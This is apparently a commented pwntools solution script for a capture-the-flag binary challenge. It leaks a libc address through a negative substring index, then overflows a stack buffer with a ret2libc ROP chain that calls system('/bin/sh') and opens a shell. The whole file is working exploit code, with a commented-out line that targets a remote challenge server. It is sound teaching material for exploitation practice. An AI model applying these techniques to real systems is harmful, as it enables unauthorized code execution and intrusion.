from pwn import *

gdbscript = "b main\nb *main+261\nc"

with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
#with remote("54.193.31.133", 13000) as conn:
    # "What is your name?"
    print(conn.recvline())
    # Input any name
    conn.sendline(b"asdf")

    # "What starting index for a name substring do you want?"
    print(conn.recvline())
    # Program uses signed arithmetic to compute src pointer, so we can
    # input a negative index. The address (name - 32) has a glibc
    # address (address to stderr object, but that doesn't matter).
    conn.sendline(b"-32")

    # "What substring length do you want?"
    print(conn.recvline())
    # Memory addresses on x86-64 are 8 bytes long
    conn.sendline(b"8")

    # "Here is your substring:"
    print(conn.recvline())
    # The resulting substring is a sequence of raw bytes that is
    # the byte representation of the leaked address. We use GDB
    # to find the base address (first address) of libc and compute
    # the offset from the leaked address to the libc base.
    line = conn.recvline(keepends=False)
    libc_leak_addr = unpack(line, "all")
    libc_base_addr = libc_leak_addr - 0x7ffff7e1b6a0 + 0x7ffff7c00000
    print(f"libc_base_addr {hex(libc_base_addr)}")

    # "What's a fun fact about yourself?"
    print(conn.recvline())
    # We use the `grep "/bin/sh\\x00"` command in GDB with GEF to search
    # for an address in libc that has a null-terminated "/bin/sh" string.
    binsh_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7dd8678
    # The set rdi ROP gadget is found using the ROPgadget tool.
    # `ROPgadget --binary libc.so.6 --ropchain --nojop`
    set_rdi_gadget_addr = libc_base_addr + 0x2a3e5
    # The offset of the system function in libc is also found using
    # GDB.
    system_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7c50d70
    # A simple ret gadget that just has one ret instruction is
    # necessary for 16-byte alignment of the stack when calling system.
    # In the Linux x86-64 ABI, rsp needs to be a multiple of 16 before
    # a call instruction, so after a call, rsp should be offset by 8
    # (rsp mod 16 = 8). Therefore, rsp needs to be offset by 8 when we
    # jump to system.
    #
    # This gadget can be found just by looking at the disassembly of
    # libc.
    # `objdump -d -M intel libc.so.6 | grep "ret" | head -n 1`
    ret_gadget_addr = libc_base_addr + 0x29cd6

    # The ROP chain payload

    # Buffer is at rbp-0x90, so fill 0x90 bytes
    # Return address is at rbp+0x8 since location at rbp is the
    # saved previous value of rbp, so fill another 8 bytes
    payload = b"h" * 0x90 + b"h" * 8
    payload += p64(set_rdi_gadget_addr)
    payload += p64(binsh_addr)
    payload += p64(ret_gadget_addr)
    payload += p64(system_addr)
    conn.sendline(payload)

    # "See you soon!"
    print(conn.recvline())

    # Now we have a shell :)
    conn.interactive()
